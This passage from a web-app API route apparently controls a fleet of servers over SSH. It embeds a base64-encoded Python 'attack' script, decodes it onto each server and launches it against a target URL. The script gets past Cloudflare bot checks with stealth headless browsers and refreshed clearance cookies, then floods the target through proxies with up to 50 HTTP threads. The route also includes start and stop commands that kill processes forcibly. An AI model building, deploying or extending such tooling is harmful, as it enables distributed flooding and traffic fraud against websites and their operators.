Y3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICAgICAgICAgICAnVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywKICAgICAgICAgICAgICAgICdTZWMtRmV0Y2gtRGVzdCc6ICdkb2N1bWVudCcsCiAgICAgICAgICAgICAgICAnU2VjLUZldGNoLU1vZGUnOiAnbmF2aWdhdGUnLAogICAgICAgICAgICAgICAgJ1NlYy1GZXRjaC1TaXRlJzogJ2Nyb3NzLXNpdGUnLAogICAgICAgICAgICAgICAgJ1NlYy1GZXRjaC1Vc2VyJzogJz8xJywKICAgICAgICAgICAgICAgICdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgcmVmOgogICAgICAgICAgICAgICAgaGVhZGVyc1snUmVmZXJlciddID0gcmVmCiAgICAgICAgICAgIGlmIGNvb2tpZV9zdHI6CiAgICAgICAgICAgICAgICBoZWFkZXJzWydDb29raWUnXSA9IGNvb2tpZV9zdHIKICAgICAgICAgICAgCiAgICAgICAgICAgIHJlcSA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodGFyZ2V0X3VybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICByZXNwID0gb3BlbmVyLm9wZW4ocmVxLCB0aW1lb3V0PTEwKQogICAgICAgICAgICBodG1sID0gcmVzcC5yZWFkKDIwMDApLmRlY29kZSgndXRmLTgnLCBlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgICAgIHN0YXR1cyA9IHJlc3Auc3RhdHVzCiAgICAgICAgICAgIAogICAgICAgICAgICAjIENoZWNrIGlmIHdlIGdvdCByZWFsIHBhZ2UgKG5vdCBDRiBjaGFsbGVuZ2Ugb3IgNDA0KQogICAgICAgICAgICBodG1sX2xvd2VyID0gaHRtbC5sb3dlcigpCiAgICAgICAgICAgIGlmIHN0YXR1cyA9PSAyMDAgYW5kIGxlbihodG1sKSA+IDUwMCBhbmQgJ2p1c3QgYSBtb21lbnQnIG5vdCBpbiBodG1sX2xvd2VyIGFuZCAncGFnZSBub3QgZm91bmQnIG5vdCBpbiBodG1sX2xvd2VyIGFuZCAnIjQwNCInIG5vdCBpbiBodG1sX2xvd2VyOgogICAgICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgICAgIGlmIHZpc2l0X2NvdW50IDwgbWF4X3Zpc2l0czoKICAgICAgICAgICAgICAgICAgICAgICAgdmlzaXRfY291bnQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgICAgIGVycm9yX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgICAgICAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgIGVycm9yX2NvdW50ICs9IDEKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjAxKQoKIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIFBIQVNFIDJCOiBCcm93c2VyIHdvcmtlciAoZmFsbGJhY2sgaWYgSFRUUCBmYWlscykKIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpkZWYgYnJvd3Nlcl93b3JrZXIoYmlkLCB0YXJnZXRfdXJsLCBtYXhfdmlzaXRzLCBzdGFydF90aW1lKToKICAgICIiIlJlYWwgYnJvd3NlciB2aXNpdG9yIC0gc2xvd2VyIGJ1dCBndWFyYW50ZWVkIiIiCiAgICBnbG9iYWwgdmlzaXRfY291bnQsIGVycm9yX2NvdW50CiAgICAKICAgIHdoaWxlIFRydWU6CiAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICBpZiB2aXNpdF9jb3VudCA+PSBtYXhfdmlzaXRzOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAKICAgICAgICBkcml2ZXIgPSBOb25lCiAgICAgICAgdHJ5OgogICAgICAgICAgICB1YSA9IHJhbmRvbS5jaG9pY2UoVVNFUl9BR0VOVFMpCiAgICAgICAgICAgIGlmIEhBU19VQzoKICAgICAgICAgICAgICAgIG9wdGlvbnMgPSB1Yy5DaHJvbWVPcHRpb25zKCkKICAgICAgICAgICAgICAgIG9wdGlvbnMuYWRkX2FyZ3VtZW50KCItLWhlYWRsZXNzPW5ldyIpCiAgICAgICAgICAgICAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgiLS1uby1zYW5kYm94IikKICAgICAgICAgICAgICAgIG9wdGlvbnMuYWRkX2FyZ3VtZW50KCItLWRpc2FibGUtZGV2LXNobS11c2FnZSIpCiAgICAgICAgICAgICAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgiLS1kaXNhYmxlLWdwdSIpCiAgICAgICAgICAgICAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgiLS13aW5kb3ctc2l6ZT00MTIsOTE1IikKICAgICAgICAgICAgICAgIG9wdGlvbnMuYWRkX2FyZ3VtZW50KCItLWpzLWZsYWdzPS0tbWF4LW9sZC1zcGFjZS1zaXplPTk2IikKICAgICAgICAgICAgICAgIG9wdGlvbnMuYWRkX2FyZ3VtZW50KGYiLS11c2VyLWFnZW50PXt1YX0iKQogICAgICAgICAgICAgICAgaWYgVVNFX1BST1hJRVM6CiAgICAgICAgICAgICAgICAgICAgb3B0aW9ucy5hZGRfYXJndW1lbnQoZiItLXByb3h5LXNlcnZlcj1odHRwOi8ve1BST1hZX1JFTEFZX0hPU1R9OntQUk9YWV9SRUxBWV9QT1JUfSIpCiAgICAgICAgICAgICAgICBkcml2ZXIgPSB1Yy5DaHJvbWUob3B0aW9ucz1vcHRpb25zLCBoZWFkbGVzcz1UcnVlLCBkcml2ZXJfZXhlY3V0YWJsZV9wYXRoPScvdXNyL2xvY2FsL2Jpbi9jaHJvbWVkcml2ZXInKQogICAgICAgICAgICBlbGlmIEhBU19TRUxFTklVTToKICAgICAgICAgICAgICAgIG9wdHMgPSBPcHRpb25zKCkKICAgICAgICAgICAgICAgIG9wdHMuYWRkX2FyZ3VtZW50KCItLWhlYWRsZXNzPW5ldyIpCiAgICAgICAgICAgICAgICBvcHRzLmFkZF9hcmd1bWVudCgiLS1uby1zYW5kYm94IikKICAgICAgICAgICAgICAgIG9wdHMuYWRkX2FyZ3VtZW50KCItLWRpc2FibGUtZGV2LXNobS11c2FnZSIpCiAgICAgICAgICAgICAgICBvcHRzLmFkZF9hcmd1bWVudCgiLS1kaXNhYmxlLWdwdSIpCiAgICAgICAgICAgICAgICBvcHRzLmFkZF9hcmd1bWVudCgiLS1kaXNhYmxlLWJsaW5rLWZlYXR1cmVzPUF1dG9tYXRpb25Db250cm9sbGVkIikKICAgICAgICAgICAgICAgIG9wdHMuYWRkX2FyZ3VtZW50KCItLXdpbmRvdy1zaXplPTQxMiw5MTUiKQogICAgICAgICAgICAgICAgb3B0cy5hZGRfYXJndW1lbnQoIi0tanMtZmxhZ3M9LS1tYXgtb2xkLXNwYWNlLXNpemU9OTYiKQogICAgICAgICAgICAgICAgb3B0cy5hZGRfYXJndW1lbnQoZiItLXVzZXItYWdlbnQ9e3VhfSIpCiAgICAgICAgICAgICAgICBvcHRzLmFkZF9leHBlcmltZW50YWxfb3B0aW9uKCdleGNsdWRlU3dpdGNoZXMnLCBbJ2VuYWJsZS1hdXRvbWF0aW9uJ10pCiAgICAgICAgICAgICAgICBpZiBVU0VfUFJPWElFUzoKICAgICAgICAgICAgICAgICAgICBvcHRzLmFkZF9hcmd1bWVudChmIi0tcHJveHktc2VydmVyPWh0dHA6Ly97UFJPWFlfUkVMQVlfSE9TVH06e1BST1hZX1JFTEFZX1BPUlR9IikKICAgICAgICAgICAgICAgIGRyaXZlciA9IHdlYmRyaXZlci5DaHJvbWUob3B0aW9ucz1vcHRzKQogICAgICAgICAgICAgICAgZHJpdmVyLmV4ZWN1dGVfY2RwX2NtZCgnUGFnZS5hZGRTY3JpcHRUb0V2YWx1YXRlT25OZXdEb2N1bWVudCcsIHsKICAgICAgICAgICAgICAgICAgICAnc291cmNlJzogZ2V0X3N0ZWFsdGhfanMoKQogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIG5vdCBkcml2ZXI6CiAgICAgICAgICAgICAgICB3aXRoIGxvY2s6IGVycm9yX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIAogICAgICAgICAgICBkcml2ZXIuc2V0X3BhZ2VfbG9hZF90aW1lb3V0KDMwKQogICAgICAgICAgICBkcml2ZXIuZ2V0KHRhcmdldF91cmwpCiAgICAgICAgICAgIAogICAgICAgICAgICAjIFdhaXQgZm9yIENGCiAgICAgICAgICAgIGZvciB3IGluIHJhbmdlKDMwKToKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgICAgIHBnID0gZHJpdmVyLnBhZ2Vfc291cmNlIG9yICcnCiAgICAgICAgICAgICAgICBpZiAnanVzdCBhIG1vbWVudCcgbm90IGluIHBnLmxvd2VyKCkgYW5kICdjaGVja2luZyB5b3VyIGJyb3dzZXInIG5vdCBpbiBwZy5sb3dlcigpOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIAogICAgICAgICAgICAjIEh1bWFuIGludGVyYWN0aW9uCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGRyaXZlci5leGVjdXRlX3NjcmlwdChnZXRfaHVtYW5faW50ZXJhY3Rpb25fanMoKSkKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgCiAgICAgICAgICAgIHRpdGxlID0gZHJpdmVyLnRpdGxlIG9yICcnCiAgICAgICAgICAgIGh0bWxfbGVuID0gbGVuKGRyaXZlci5wYWdlX3NvdXJjZSkgaWYgZHJpdmVyLnBhZ2Vfc291cmNlIGVsc2UgMAogICAgICAgICAgICAKICAgICAgICAgICAgcGFnZV9zcmMgPSAoZHJpdmVyLnBhZ2Vfc291cmNlIG9yICcnKS5sb3dlcigpWzo1MDAwXQogICAgICAgICAgICBpZiBodG1sX2xlbiA+IDUwMCBhbmQgdGl0bGUgYW5kICdqdXN0IGEgbW9tZW50JyBub3QgaW4gdGl0bGUubG93ZXIoKSBhbmQgJzQwNCcgbm90IGluIHRpdGxlIGFuZCAnbm90IGZvdW5kJyBub3QgaW4gdGl0bGUubG93ZXIoKSBhbmQgJ3BhZ2Ugbm90IGZvdW5kJyBub3QgaW4gcGFnZV9zcmM6CiAgICAgICAgICAgICAgICB3aXRoIGxvY2s6CiAgICAgICAgICAgICAgICAgICAgaWYgdmlzaXRfY291bnQgPCBtYXhfdmlzaXRzOgogICAgICAgICAgICAgICAgICAgICAgICB2aXNpdF9jb3VudCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB3aXRoIGxvY2s6IGVycm9yX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIAogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgd2l0aCBsb2NrOiBlcnJvcl9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgZHJpdmVyOiBkcml2ZXIucXVpdCgpCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcwoKIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIFBIQVNFIDM6IENvb2tpZSByZWZyZXNoZXIgKGJhY2tncm91bmQpCiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KZGVmIGNvb2tpZV9yZWZyZXNoZXIodGFyZ2V0X3VybCk6CiAgICAiIiJSZWZyZXNoIENGIGNvb2tpZXMgZXZlcnkgMyBtaW51dGVzIiIiCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRpbWUuc2xlZXAoMTgwKQogICAgICAgIHByaW50KCJbQ09PS0lFLVJFRlJFU0hdIFJlZnJlc2hpbmcgQ0YgY29va2llcy4uLiIsIGZsdXNoPVRydWUpCiAgICAgICAgZ2V0X2NmX2Nvb2tpZXNfYnJvd3Nlcih0YXJnZXRfdXJsKQoKIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIE1BSU4gQVRUQUNLIE9SQ0hFU1RSQVRPUgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmRlZiBydW5fYXR0YWNrKHRhcmdldF91cmwsIG1heF92aXNpdG9ycz0xMDApOgogICAgZ2xvYmFsIHZpc2l0X2NvdW50LCBlcnJvcl9jb3VudCwgREVURUNURURfTU9ERQogICAgdmlzaXRfY291bnQgPSAwCiAgICBlcnJvcl9jb3VudCA9IDAKICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQogICAgCiAgICB3cml0ZV9zdGF0dXMobWF4X3Zpc2l0b3JzLCBzdGFydF90aW1lLCAic3RhcnRpbmciKQogICAgcHJpbnQoZiJbSFlCUklEXSBUYXJnZXQ6IHt0YXJnZXRfdXJsfSB8IEdvYWw6IHttYXhfdmlzaXRvcnN9IHZpc2l0b3JzIiwgZmx1c2g9VHJ1ZSkKICAgIAogICAgIyBTdGVwIDE6IEdldCBDRiBjb29raWVzCiAgICBwcmludCgiW1NURVAgMV0gR2V0dGluZyBDRiBjbGVhcmFuY2UgY29va2llcyB2aWEgcmVhbCBicm93c2VyLi4uIiwgZmx1c2g9VHJ1ZSkKICAgIGdvdF9jb29raWVzID0gZ2V0X2NmX2Nvb2tpZXNfYnJvd3Nlcih0YXJnZXRfdXJsKQogICAgCiAgICBpZiBnb3RfY29va2llczoKICAgICAgICBwcmludChmIltTVEVQIDFdIENvb2tpZXMgb2J0YWluZWQhIFRlc3RpbmcgZmFzdCBIVFRQLi4uIiwgZmx1c2g9VHJ1ZSkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZiJbU1RFUCAxXSBObyBjb29raWVzLCB3aWxsIHVzZSBicm93c2VyLW9ubHkgbW9kZSIsIGZsdXNoPVRydWUpCiAgICAKICAgICMgU3RlcCAyOiBUZXN0IGlmIEhUVFAgd29ya3Mgd2l0aCBjb29raWVzCiAgICBodHRwX3dvcmtzID0gRmFsc2UKICAgIGlmIGdvdF9jb29raWVzOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBjZl9jb29raWVzX2xvY2s6CiAgICAgICAgICAgICAgICBjb29raWVzID0gZGljdChjZl9jb29raWVzKQogICAgICAgICAgICBjb29raWVfc3RyID0gJzsgJy5qb2luKGYne2t9PXt2fScgZm9yIGssIHYgaW4gY29va2llcy5pdGVtcygpKQogICAgICAgICAgICAKICAgICAgICAgICAgcHJveHlfaGFuZGxlciA9IHVybGxpYi5yZXF1ZXN0LlByb3h5SGFuZGxlcih7CiAgICAgICAgICAgICAgICAnaHR0cCc6IGYnaHR0cDovL3tQUk9YWV9SRUxBWV9IT1NUfTp7UFJPWFlfUkVMQVlfUE9SVH0nLAogICAgICAgICAgICAgICAgJ2h0dHBzJzogZidodHRwOi8ve1BST1hZX1JFTEFZX0hPU1R9OntQUk9YWV9SRUxBWV9QT1JUfScsCiAgICAgICAgICAgIH0pIGlmIFVTRV9QUk9YSUVTIGVsc2UgdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKHt9KQogICAgICAgICAgICBvcGVuZXIgPSB1cmxsaWIucmVxdWVzdC5idWlsZF9vcGVuZXIocHJveHlfaGFuZGxlcikKICAgICAgICAgICAgCiAgICAgICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICAgICAnVXNlci1BZ2VudCc6IGNmX3VhIG9yIFVTRVJfQUdFTlRTWzBdLAogICAgICAgICAgICAgICAgJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgnLAogICAgICAgICAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdhcixlbi1VUztxPTAuNyxlbjtxPTAuMycsCiAgICAgICAgICAgICAgICAnQ29va2llJzogY29va2llX3N0ciwKICAgICAgICAgICAgICAgICdTZWMtRmV0Y2gtRGVzdCc6ICdkb2N1bWVudCcsCiAgICAgICAgICAgICAgICAnU2VjLUZldGNoLU1vZGUnOiAnbmF2aWdhdGUnLAogICAgICAgICAgICB9CiAgICAgICAgICAgIHJlcSA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodGFyZ2V0X3VybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICByZXNwID0gb3BlbmVyLm9wZW4ocmVxLCB0aW1lb3V0PTE1KQogICAgICAgICAgICBodG1sID0gcmVzcC5yZWFkKDMwMDApLmRlY29kZSgndXRmLTgnLCBlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgICAgIAogICAgICAgICAgICBodG1sX2xvd2VyID0gaHRtbC5sb3dlcigpCiAgICAgICAgICAgIGlmIHJlc3Auc3RhdHVzID09IDIwMCBhbmQgbGVuKGh0bWwpID4gNTAwIGFuZCAnanVzdCBhIG1vbWVudCcgbm90IGluIGh0bWxfbG93ZXIgYW5kICdwYWdlIG5vdCBmb3VuZCcgbm90IGluIGh0bWxfbG93ZXIgYW5kICciNDA0Iicgbm90IGluIGh0bWxfbG93ZXI6CiAgICAgICAgICAgICAgICBodHRwX3dvcmtzID0gVHJ1ZQogICAgICAgICAgICAgICAgcHJpbnQoZiJbU1RFUCAyXSBIVFRQIHdpdGggY29va2llcyBXT1JLUyEgVXNpbmcgVFVSQk8gbW9kZSIsIGZsdXNoPVRydWUpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludChmIltTVEVQIDJdIEhUVFAgYmxvY2tlZCAoc3RhdHVzPXtyZXNwLnN0YXR1c30sIGxlbj17bGVuKGh0bWwpfSkuIEZhbGxiYWNrIHRvIGJyb3dzZXIiLCBmbHVzaD1UcnVlKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZiJbU1RFUCAyXSBIVFRQIHRlc3QgZmFpbGVkOiB7ZX0uIEZhbGxiYWNrIHRvIGJyb3dzZXIiLCBmbHVzaD1UcnVlKQogICAgCiAgICAjIFN0ZXAgMzogTGF1bmNoIGF0dGFjawogICAgdGhyZWFkcyA9IFtdCiAgICAKICAgIGlmIGh0dHBfd29ya3M6CiAgICAgICAgIyBUVVJCTyBNT0RFOiA1MCBIVFRQIHRocmVhZHMgKyBjb29raWUgcmVmcmVzaGVyCiAgICAgICAgREVURUNURURfTU9ERSA9ICd0dXJibycKICAgICAgICBudW1fdGhyZWFkcyA9IDUwCiAgICAgICAgcHJpbnQoZiJbVFVSQk8gTU9ERV0gTGF1bmNoaW5nIHtudW1fdGhyZWFkc30gSFRUUCB0aHJlYWRzICh0YXJnZXQ6IH4xMDAwIHZpc2l0cy9taW4pIiwgZmx1c2g9VHJ1ZSkKICAgICAgICAKICAgICAgICAjIENvb2tpZSByZWZyZXNoZXIKICAgICAgICBjciA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWNvb2tpZV9yZWZyZXNoZXIsIGFyZ3M9KHRhcmdldF91cmwsKSwgZGFlbW9uPVRydWUpCiAgICAgICAgY3Iuc3RhcnQoKQogICAgICAgIAogICAgICAgIGZvciBpIGluIHJhbmdlKG51bV90aHJlYWRzKToKICAgICAgICAgICAgdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWZhc3RfaHR0cF93b3JrZXIsIGFyZ3M9KGksIHRhcmdldF91cmwsIG1heF92aXNpdG9ycywgc3RhcnRfdGltZSksIGRhZW1vbj1UcnVlKQogICAgICAgICAgICB0LnN0YXJ0KCkKICAgICAgICAgICAgdGhyZWFkcy5hcHBlbmQodCkKICAgICAgICAKICAgICAgICAjIEFsc28gcnVuIDIgYnJvd3NlcnMgYXMgYmFja3VwIHRvIGtlZXAgY29va2llcyBmcmVzaAogICAgICAgIGZvciBpIGluIHJhbmdlKDIpOgogICAgICAgICAgICB0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9YnJvd3Nlcl93b3JrZXIsIGFyZ3M9KGksIHRhcmdldF91cmwsIG1heF92aXNpdG9ycywgc3RhcnRfdGltZSksIGRhZW1vbj1UcnVlKQogICAgICAgICAgICB0LnN0YXJ0KCkKICAgICAgICAgICAgdGhyZWFkcy5hcHBlbmQodCkKICAgIGVsc2U6CiAgICAgICAgIyBCUk9XU0VSIE1PREU6IDggYnJvd3NlciB3b3JrZXJzCiAgICAgICAgREVURUNURURfTU9ERSA9ICdzdGVhbHRoJwogICAgICAgIG51bV9icm93c2VycyA9IDgKICAgICAgICBwcmludChmIltTVEVBTFRIIE1PREVdIExhdW5jaGluZyB7bnVtX2Jyb3dzZXJzfSBicm93c2VyIHdvcmtlcnMiLCBmbHVzaD1UcnVlKQogICAgICAgIAogICAgICAgIGZvciBpIGluIHJhbmdlKG51bV9icm93c2Vycyk6CiAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1icm93c2VyX3dvcmtlciwgYXJncz0oaSwgdGFyZ2V0X3VybCwgbWF4X3Zpc2l0b3JzLCBzdGFydF90aW1lKSwgZGFlbW9uPVRydWUpCiAgICAgICAgICAgIHQuc3RhcnQoKQogICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuNSkKICAgIAogICAgIyBNb25pdG9yCiAgICB3cml0ZV9zdGF0dXMobWF4X3Zpc2l0b3JzLCBzdGFydF90aW1lLCAicnVubmluZyIpCiAgICBsYXN0X2NvdW50ID0gMAogICAgc3RhbGxfY2hlY2tzID0gMAogICAgCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICB3cml0ZV9zdGF0dXMobWF4X3Zpc2l0b3JzLCBzdGFydF90aW1lLCAicnVubmluZyIpCiAgICAgICAgCiAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICBjdXJyZW50ID0gdmlzaXRfY291bnQKICAgICAgICAgICAgZXJycyA9IGVycm9yX2NvdW50CiAgICAgICAgCiAgICAgICAgZWxhcHNlZCA9IGludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpCiAgICAgICAgcmF0ZSA9IHJvdW5kKGN1cnJlbnQgLyBtYXgoZWxhcHNlZCwgMSkgKiA2MCwgMSkKICAgICAgICBwcmludChmIltNT05JVE9SXSB7Y3VycmVudH0ve21heF92aXNpdG9yc30gdmlzaXRzIHwge2VycnN9IGVycm9ycyB8IHtlbGFwc2VkfXMgfCB7cmF0ZX0vbWluIiwgZmx1c2g9VHJ1ZSkKICAgICAgICAKICAgICAgICBpZiBjdXJyZW50ID49IG1heF92aXNpdG9yczoKICAgICAgICAgICAgYnJlYWsKICAgICAgICAKICAgICAgICAjIElmIHN0YWxsZWQgZm9yIDMwcyBpbiB0dXJibyBtb2RlLCBzd2l0Y2ggdG8gbW9yZSBicm93c2VycwogICAgICAgIGlmIGN1cnJlbnQgPT0gbGFzdF9jb3VudDoKICAgICAgICAgICAgc3RhbGxfY2hlY2tzICs9IDEKICAgICAgICAgICAgaWYgc3RhbGxfY2hlY2tzID49IDEwIGFuZCBodHRwX3dvcmtzIGFuZCBERVRFQ1RFRF9NT0RFID09ICd0dXJibyc6CiAgICAgICAgICAgICAgICBwcmludCgiW01PTklUT1JdIFR1cmJvIHN0YWxsZWQhIEFkZGluZyBtb3JlIGJyb3dzZXIgd29ya2Vycy4uLiIsIGZsdXNoPVRydWUpCiAgICAgICAgICAgICAgICBmb3IgaSBpbiByYW5nZSg0KToKICAgICAgICAgICAgICAgICAgICB0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9YnJvd3Nlcl93b3JrZXIsIGFyZ3M9KDEwMCtpLCB0YXJnZXRfdXJsLCBtYXhfdmlzaXRvcnMsIHN0YXJ0X3RpbWUpLCBkYWVtb249VHJ1ZSkKICAgICAgICAgICAgICAgICAgICB0LnN0YXJ0KCkKICAgICAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgc3RhbGxfY2hlY2tzID0gMAogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHN0YWxsX2NoZWNrcyA9IDAKICAgICAgICAgICAgbGFzdF9jb3VudCA9IGN1cnJlbnQKICAgIAogICAgZWxhcHNlZCA9IGludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpCiAgICByYXRlID0gcm91bmQodmlzaXRfY291bnQgLyBtYXgoZWxhcHNlZCwgMSkgKiA2MCwgMSkKICAgIHdyaXRlX3N0YXR1cyhtYXhfdmlzaXRvcnMsIHN0YXJ0X3RpbWUsICJmaW5pc2hlZCIpCiAgICBwcmludChmIltET05FXSBWaXNpdHM6e3Zpc2l0X2NvdW50fSBFcnJvcnM6e2Vycm9yX2NvdW50fSBUaW1lOntlbGFwc2VkfXMgUmF0ZTp7cmF0ZX0vbWluIiwgZmx1c2g9VHJ1ZSkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICB1cmwgPSBzeXMuYXJndlsxXSBpZiBsZW4oc3lzLmFyZ3YpID4gMSBlbHNlICJodHRwOi8vZXhhbXBsZS5jb20iCiAgICB2aXNpdG9ycyA9IGludChzeXMuYXJndlsyXSkgaWYgbGVuKHN5cy5hcmd2KSA+IDIgZWxzZSAxMDAKICAgIAogICAgIyBFbnN1cmUgcHJveHkgaXMgcnVubmluZwogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5zZXR0aW1lb3V0KDIpCiAgICAgICAgcy5jb25uZWN0KCgnMTI3LjAuMC4xJywgMTgwODApKQogICAgICAgIHMuY2xvc2UoKQogICAgICAgIHByaW50KCJbUFJPWFldIFJlbGF5IGlzIHJ1bm5pbmcgb24gcG9ydCAxODA4MCIsIGZsdXNoPVRydWUpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoIltQUk9YWV0gU3RhcnRpbmcgcHJveHkgcmVsYXkuLi4iLCBmbHVzaD1UcnVlKQogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oWydweXRob24zJywgJy9yb290L3Byb3h5X3JlbGF5LnB5J10sIHN0ZG91dD1vcGVuKCcvcm9vdC9wcm94eS5sb2cnLCd3JyksIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCkKICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAKICAgIHJ1bl9hdHRhY2sodXJsLCB2aXNpdG9ycykK";
      
      const results = await Promise.all(
        serverList.map(async (server) => {
          const deployCmd = `echo "${scriptB64}" | base64 -d > /root/visit.py && wc -c /root/visit.py && echo "Script deployed successfully"`;
          const r = await runSSHCommand(server, deployCmd, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'start') {
      if (!url) return NextResponse.json({ error: "URL is required" }, { status: 400 });
      const totalVisitors = visitors || 100;
      const serverCount = serverList.length;
      const perServer = Math.ceil(totalVisitors / serverCount);
      const captchaArg = captchaApiKey || '';

      // Build the full start command - kill old, deploy relay, start attack - ALL IN ONE SSH command
      const proxyConfig = (proxies && proxies.length > 0) ? proxies[0] : null;
      
      const results = await Promise.all(
        serverList.map(async (server) => {
          let fullCmd = '';
          
          // Kill old processes
          fullCmd += 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; kill -9 $(pgrep -f "proxy_relay.py") 2>/dev/null; killall -9 chrome chromedriver 2>/dev/null; fuser -k 18080/tcp 2>/dev/null; rm -f /root/visit_status.json /root/visit.log /root/attack.log; sleep 1; ';
          
          // Deploy and start proxy relay
          if (proxyConfig) {
            const relayScript = buildRelayScript(proxyConfig.host, proxyConfig.port, proxyConfig.username, proxyConfig.password);
            const relayB64 = Buffer.from(relayScript).toString('base64');
            fullCmd += 'fuser -k 18080/tcp 2>/dev/null; echo "' + relayB64 + '" | base64 -d > /root/proxy_relay.py && nohup python3 /root/proxy_relay.py > /root/relay.log 2>&1 & sleep 2; ';
          }
          
          // Start attack
          if (proxies && proxies.length > 0) {
            const proxyB64 = Buffer.from(JSON.stringify(proxies)).toString('base64');
            fullCmd += `echo "${proxyB64}" | base64 -d > /root/proxies.json && nohup python3 /root/visit.py "${url}" ${perServer} /root/proxies.json "${captchaArg}" > /root/visit.log 2>&1 & echo "Started PID=$!"`;
          } else {
            fullCmd += `nohup python3 /root/visit.py "${url}" ${perServer} "" "${captchaArg}" > /root/visit.log 2>&1 & echo "Started PID=$!"`;
          }
          
          const r = await runSSHCommand(server, fullCmd, 12000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'stop') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; kill -9 $(pgrep -f "proxy_relay.py") 2>/dev/null; killall -9 chrome chromedriver 2>/dev/null; killall -9 chromium 2>/dev/null; rm -f /root/visit_status.json /root/attack.log; echo "Stopped"', 8000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else {
